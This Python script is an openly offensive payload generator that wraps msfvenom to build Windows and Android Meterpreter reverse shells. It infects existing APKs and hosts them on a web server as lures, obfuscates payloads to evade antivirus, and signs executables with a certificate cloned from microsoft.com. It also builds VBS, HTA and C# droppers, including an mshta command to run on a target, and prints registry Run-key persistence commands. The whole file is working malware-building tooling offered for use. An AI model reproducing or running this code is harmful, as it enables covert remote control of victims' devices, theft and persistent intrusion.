import os
import string
import random
import time
import requests
import base64
import netifaces as nat
import binascii
Red ="\u001b[31m"
Green ="\u001b[32m"
Blue = '\033[94m'

def androidmodules():
    def signapk(name):
        os.system("java -jar apksigner.jar --apks androidpayloads/"+name+".apk >/dev/null 2>&1")
        os.system("cd androidpayloads && mv "+name+"-aligned-debugSigned.apk "+name+".apk")
    def Attackvector(ip):
        vectorattack = input("do you want to start Vector-Attack:")
        if vectorattack == "yes":
            os.system("service apache2 start")
            os.system("cp -r  androidpayloads/" + name + ".apk /var/www/html")
            os.system('cp -r  template/index.html /var/www/html')
            inplace_change('/var/www/html/index.html','$payload',name+".apk")
            print("VectorAttack Started: http://"+ip)
        else:
            pass

    def listeners(type,ip,lport,name):
        listen = input(Green + "do you want to start multi/handler:")
        if listen == "yes":
            with open("handlers/" + name + ".rc", "w") as hand:
                hand.write("use multi/handler\n")
                hand.write("set payload  android/meterpreter/reverse_" + type + "\n")
                hand.write("set lhost " + ip + "\n")
                hand.write("set lport " + lport + "\n")
                hand.write("exploit")
                hand.close()
                os.system("sudo msfconsole -r handlers/" + name + ".rc")

    print("""
1)Generate Android Payload
2)Infect Apk(will not Work with all apks)
          """)
    cmodules = int(input("chosse:"))
    if cmodules == 1:
        ip = input("entre Lhost:")
        port = input("entre lport:")
        name = input("entre PayloadName:")
        print(Blue, """
             available payloads
                   1)android/meterpreter/reverse_tcp
                   2)android/meterpreter/reverse_https
                   3)android/meterpreter/reverse_http
                   """)
        def generate():
            x = int(input("choose option:"))
            if x == 1:
                os.system("msfvenom -p android/meterpreter/reverse_tcp lhost=" + ip + " lport=" + port + " -o androidpayloads/"+name+".apk >/dev/null 2>&1")
                print(Green,'[+]Generating Payload')
                signapk(name)
                time.sleep(3)
                print("payload saved as androidpayloads/" + name + ".apk")
                Attackvector(ip)
                listeners("tcp",ip,port,name)

            elif x == 2:
                os.system("msfvenom -p android/meterpreter/reverse_https lhost=" + ip + " lport=" + port + " -o androidpayloads/"+name+".apk >/dev/null 2>&1")
                print(Green, '[+]Generating Payload')
                signapk(name)
                time.sleep(3)
                print("payload saved as androidpayloads/" + name + ".apk")
                Attackvector(ip)
                listeners("https",ip,port,name)
            elif x == 3:
                os.system("msfvenom -p android/meterpreter/reverse_http lhost=" + ip + " lport=" + port + " -o androidpayloads/"+name+".apk >/dev/null 2>&1")
                print(Green, '[+]Generating Payload')
                signapk(name)
                time.sleep(3)
                print("payload saved as androidpayloads/" + name + ".apk")
                Attackvector(ip)
                listeners("http",ip,port,name)
            else:
                print("option not found")
                generate()
        generate()
    elif cmodules == 2:
        ip = input("entre Lhost:")
        port = input("entre lport:")
        name = input("entre PayloadName:")
        apkinfect = input("entre apk to infect:")
        print(Blue, """
                     available payloads
                           1)android/meterpreter/reverse_tcp
                           2)android/meterpreter/reverse_https
                           3)android/meterpreter/reverse_http
                           """)

        def infectapk():
            def resigninfectedapk():
                sign = input("do you want to try resign this apk:")
                if sign == "yes":
                    os.system("java -jar apksigner.jar --apks androidpayloads/" + name + ".apk >/dev/null 2>&1")
                    signing = os.system(
                        "cd androidpayloads && mv " + name + "-aligned-debugSigned.apk " + name + ".apk >/dev/null 2>&1")
                    if signing == 0:
                        pass
                    else:
                        os.system("apktool d " + name + ".apk >/dev/null 2>&1")
                        os.system("rm -r androidpayloads/" + name + ".apk")
                        # recompile
                        os.system("apktool b " + name + " >/dev/null 2>&1")
                        os.system("cd androidpayloads/" + name + "/dist && mv " + name + ".apk ../..")
                        os.system("java -jar apksigner.jar --apks androidpayloads/" + name + ".apk ")
                else:
                    pass


            def checkinjection():
                if os.path.exists('androidpayloads/' + name + '.apk') == True:
                    pass
                else:
                    print(Red,'[-]can t inject meterpreter on apk')
                    exit()
            x = int(input("choose option:"))
            if x == 1:
                os.system("msfvenom -p android/meterpreter/reverse_http lhost=" + ip + " lport=" + port + " -x " + apkinfect + " -o androidpayloads/" + name + ".apk >/dev/null 2>&1")
                print(Green, '[+]Injecting Meterpreter in Apk')
                checkinjection()
                resigninfectedapk()
                time.sleep(3)
                print("payload saved as androidpayloads/" + name + ".apk")
                Attackvector(ip)
                listeners("tcp",ip,port,name)
            elif x == 2:
                os.system("msfvenom -p android/meterpreter/reverse_http lhost=" + ip + " lport=" + port + " -x " + apkinfect + " -o androidpayloads/" + name + ".apk >/dev/null 2>&1")
                print(Green, '[+]Injecting Meterpreter in Apk')
                checkinjection()
                resigninfectedapk()
                time.sleep(3)
                print("payload saved as androidpayloads/" + name + ".apk")
                Attackvector(ip)
                listeners("https",ip,port,name)
            elif x == 3:
                os.system("msfvenom -p android/meterpreter/reverse_http lhost=" + ip + " lport=" + port + " -x "+apkinfect+" -o androidpayloads/" + name + ".apk >/dev/null 2>&1")
                print(Green, '[+]Injecting Meterpreter in Apk')
                checkinjection()
                resigninfectedapk()
                time.sleep(3)
                print("payload saved as androidpayloads/" + name + ".apk")
                Attackvector(ip)
                listeners("http",ip,port,name)
            else:
                print("option not found")
                infectapk()

        infectapk()

def signexe():
    sign = input("do you want to sign your exe:")
    if sign == "yes":
        to_clone = input("entre website to clone sert from it Default(www.microsoft.com):")

        if to_clone == "":
            print("Using Default Mode")
            os.system("python3 signer-exe.py  www.microsoft.com 443 payloads/Dropper.exe signed.exe")
            os.system("mv signed.exe payloads/ && cd payloads/ && rm -rf Dropper.exe")
            print("Saved as payloads/signed.exe")
        else:
            port = input("entre the Port ex(443):")
            os.system("python3 signer-exe.py "+to_clone+ " " +port+   "payloads/Dropper.exe signed.exe")
            os.system("mv signed.exe payloads/ && cd payloads/ && rm -rf Dropper.exe")
            print("Saved as payloads/signed.exe")

def check_root():
    if os.getuid() == 0:
        pass
    else:
        print(Red+'run this as root  pls')
        exit()
check_root()

def HTAattack(ip):
    name = randomtask
    payload_input = input("entre your payload Path:")
    if os.path.exists(payload_input):
        os.system("cat "+payload_input+" > payload.txt")
        with open('payload.txt','rb') as payload:
            read = payload.read()
        encoded  = binascii.hexlify(read)
        data = encoded.decode('utf-8')
        datapar = "".join(data.splitlines())
        os.system("cp -r template/Dropper.hta payloads/")
        inplace_change('payloads/Dropper.hta','$ENCODEDPAYLOAD',datapar)
        os.system("cd payloads && mv Dropper.hta "+name+" && mv "+name+" /var/www/html")
        os.system("rm -rf payload.txt")
        print("execute this on Target System: mshta http://"+ip+"/"+name)


    else:
        print("[-] I can t Find your Payload")
        exit()


def makedropper():
    payload_input = input("entre your payload Path:")
    if os.path.exists(payload_input):
        os.system("cat " + payload_input + " | base64 > payload.txt")
        with open("payload.txt") as payload:
            read = payload.read()
            datapar = "".join( read.splitlines())
            os.system("rm -rf payload.txt")
            os.system("cp -r template/Dropper.vbs  payloads/")
            inplace_change('payloads/Dropper.vbs', '#ENCODEDPAYLOAD', datapar)
            print("Saved As Dropper.vbs in /payloads")
            print("to Make it FUD Use This(https://hackfree.org/VbsCrypter/)")
    else:
        print("[-] I can t Find your Payload")
        exit()
def startapche():
    os.system("sudo service apache2 start")


class Encrypt:
    def __init__(self):
        self.YELLOW, self.GREEN = '\33[93m', '\033[1;32m'
        self.text = ""
        self.enc_txt = ""

    def encrypt(self, filename):
        print(f"\n{self.YELLOW}[*] Encrypting Source Codes...")
        with open(filename, "r") as f:
            lines_list = f.readlines()
            for lines in lines_list:
                self.text += lines

            self.text = self.text.encode()
            self.enc_txt = base64.b64encode(self.text)

        with open(filename, "w") as f:
            f.write(f"import base64; exec(base64.b64decode({self.enc_txt}))")
        time.sleep(2)
        print(f"{self.GREEN}[+] Code Encrypted\n")

Len = 8
randomtask = ''.join(random.choices(string.ascii_uppercase + string.digits, k=Len))


def Banner():
    os.system("clear")
    print(Green+""" 
 ____   __   _  _  ___  ____  _  _ 
(  _ \ /__\ ( \/ )/ __)( ___)( \( )
 )___//(__)\ \  /( (_-. )__)  )  ( 
(__) (__)(__)(__) \___/(____)(_)\_)
Coded By youhacker55

Don t upload Payload To VirusTotal 
  """)

z = random.randint(40,50)

S = z

ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k=S))



def listeners():
    listen = input(Green+"do you want to start multi/handler:")
    if listen == "yes":
        with open("handlers/"+payloadname+".rc","w") as hand:
            hand.write("use multi/handler\n")
            hand.write("set payload windows/meterpreter/reverse_"+prot+"\n")
            hand.write("set lhost "+lhost+"\n")
            hand.write("set lport "+lport+"\n")
            hand.write("exploit")
            hand.close()
            os.system("sudo msfconsole -r handlers/"+payloadname+".rc")
def ngrokhandler(nglport,prot):
    with open("handlers/ngrok.rc", "w") as hand:
        hand.write("use multi/handler\n")
        hand.write("set payload windows/meterpreter/reverse_" + prot + "\n")
        hand.write("set lhost 0.0.0.0 \n")
        hand.write("set lport " + nglport + "\n")
        hand.write("exploit")
        hand.close()



def inplace_change(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            return

    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)

Banner()
print(Red+"""
1)Generate Payload
2)AutoPortForwarding(Ngrok)
3)Help Me With Persistence
4)Simple VBS Dropper
5)Simple HTA attack
6)C# Payload
7)Android Payloads
""")
choose = int(input("root@Gen:"))

if choose == 1:
    lhost = input(Green+"entre Lhost:")
    lport = input(Green+"entre Lport:")
    prot=input(Green+"Payload_Type(tcp,https):")
    payloadname = input(Green + "entre PayloadName:")
    os.system("msfvenom -p windows/meterpreter/reverse_" + prot + "  LHOST=" + lhost + " LPORT=" + lport + " SessionExpirationTimeout=0 SessionCommunicationTimeout=0 exitfunc=process  -f psh-cmd -o payload.bat >/dev/null 2>&1")
    print(Green + "[*]Generating Payload")
    inplace_change("payload.bat", "%COMSPEC%", "cmd.exe")
    with open("payload.bat") as reverseshell:
        thepay = reverseshell.read()
    os.system("cp -r template/payload.py  payloads/")
    os.system("cd payloads/ && mv payload.py " + payloadname + ".py")
    inplace_change("payloads/" + payloadname + ".py", "changeme", thepay)
    inplace_change("payloads/" + payloadname + ".py", "RANDROMSTRING", ran)

    print("Adding Some Junk Code To Evade AV :)")
    time.sleep(1)
    os.remove("payload.bat")
    enc = Encrypt()
    enc.encrypt("payloads/" + payloadname + ".py")
    print("Payload Saved in payloads/")
    time.sleep(5)
    listeners()
elif choose == 2:

    try:
        prot = input(Green + "Payload_Type(tcp,https):")
        payloadname = input(Green + "entre PayloadName:")
        port = input("entre ngrok localport:")
        ngrokhandler(port,prot)
        os.system("xterm -fg green -bg black -e ngrok tcp " + port + " & ")
        time.sleep(5)

        url = "http://127.0.0.1:4040/api/tunnels"
        recived = requests.get(url)
        tcp = recived.json()["tunnels"][0]["public_url"]
        ngrokhost = (tcp[6:20])
        ngrokport = (tcp[21:])
        os.system("msfvenom -p windows/meterpreter/reverse_" + prot + "  LHOST=" + ngrokhost + " LPORT=" + ngrokport + " SessionExpirationTimeout=0 SessionCommunicationTimeout=0 exitfunc=process  -f psh-cmd -o payload.bat >/dev/null 2>&1")
        print(Green + "[*]Generating Payload")
        inplace_change("payload.bat", "%COMSPEC%", "cmd.exe")
        with open("payload.bat") as reverseshell:
            thepay = reverseshell.read()
        os.system("cp -r template/payload.py  payloads/")
        os.system("cd payloads/ && mv payload.py " + payloadname + ".py")
        inplace_change("payloads/" + payloadname + ".py", "changeme", thepay)
        inplace_change("payloads/" + payloadname + ".py", "RANDROMSTRING", ran)
        print("Adding Some Junk Code To Evade AV :)")
        os.remove("payload.bat")
        enc = Encrypt()
        enc.encrypt("payloads/" + payloadname + ".py")
        print("Payload Saved in payloads/")
        time.sleep(5)
        multhandler = input("do you want to start multi/handler:")
        if multhandler == "yes":
            os.system("sudo msfconsole -r handlers/ngrok.rc")
        else:
            exit()



    except requests.ConnectionError:
        print("Check Ngrok Authtoken")
        exit()





elif choose == 3:
    admin = input("Do you Have Admin Priv:")
    if admin == "yes":
        task = input("entre the taskName (Entre For Random 1):")
        if task == "":
            path = input("Entre Payload Path on The Target Sys:")
            command = 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "' + randomtask + '" /t REG_SZ /F /D "' + path + '"'
            print(Green+" Type this on Target Shell ==> ",Red+command+'\n')
        else:
            path = input("Entre Payload Path on The Target Sys:")
            command = 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "' + task + '" /t REG_SZ /F /D "' + path + '"'
            print(Green+" Type this on Target Shell ==> ",Red+ command)
    else:
        task = input("entre the taskName (Entre For Random 1):")
        if task == "":
            path = input("Entre Payload Path on The Target Sys:")
            command = 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "'+randomtask +'" /t REG_SZ /F /D "'+path+'"'
            print(Green + " Type this on Target Shell ==> ", Red + command + '\n')
        else:
            path = input("Entre Payload Path on The Target Sys:")
            command = 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "' +task+ '" /t REG_SZ /F /D "' + path + '"'
            print(Green + " Type this on Target Shell ==> ", Red + command + '\n')
elif choose == 4:
    makedropper()
elif choose == 5:
    interfaces_list = nat.interfaces()
    int_str = str(interfaces_list)
    print("Available Interfaces: "+int_str)
    interface = input("choose which interface you will use for the apache2 server:")
    if  interface in interfaces_list:
        try:
            
            ip = nat.ifaddresses(interface)[nat.AF_INET][0]['addr']
            startapche()
            HTAattack(ip)
        except KeyError:
            print("this Interface Not Connected to A Network")


    else:
        print("I can t Find That Interface")
        print("Hope you know what are you Doing")
        time.sleep(2)
        try:
            startapche()
            ip = nat.ifaddresses(interface)[nat.AF_INET][0]['addr']
            HTAattack(ip)
        except ValueError:
            print("Error Interface Not Found")
elif choose == 6:
    print("""
1)Entre Powershell Payload
2)Using Msf Payload Automaticly
    """)
    payload = int(input("choose:"))
    if payload == 1:
        os.system("cp -r template/Dropper.cs payloads/")
        powershell_payload = input("entre your powershell payload:")
        datapar = "".join(powershell_payload.splitlines())
        inplace_change('payloads/Dropper.cs',"PAYLOAD",datapar)
        inplace_change('payloads/Dropper.cs', "$RandomString", ran)
    elif payload == 2:
        os.system("cp -r template/Dropper.cs payloads/")
        prot = input("entre Payload type ex(tcp,https):")
        lhost = input("entre lhost:")
        lport = input("entre lport:")
        os.system("msfvenom -p windows/meterpreter/reverse_" + prot + "  LHOST=" + lhost + " LPORT=" + lport + " SessionExpirationTimeout=0 SessionCommunicationTimeout=0 exitfunc=process  -f psh-cmd -o payload.bat >/dev/null 2>&1")
        print(Green + "[*]Generating Payload")
        inplace_change("payload.bat", "%COMSPEC%", "cmd.exe")
        with open("payload.bat") as reverseshell:
            thepay = reverseshell.read()
        payloadname = "Dropper"
        inplace_change('payloads/Dropper.cs', "PAYLOAD", thepay)
        inplace_change('payloads/Dropper.cs', "$RandomString", ran)
        os.remove('payload.bat')
        os.system("cd payloads/ && mcs -out:Dropper.exe Dropper.cs >/dev/null 2>&1")
        print(Green+"[+]Compiling your Payload")
        os.remove('payloads/Dropper.cs')
        print("payload Svaed as payloads/Dropper.exe")
        signexe()
        listeners()
elif choose == 7:
    androidmodules()
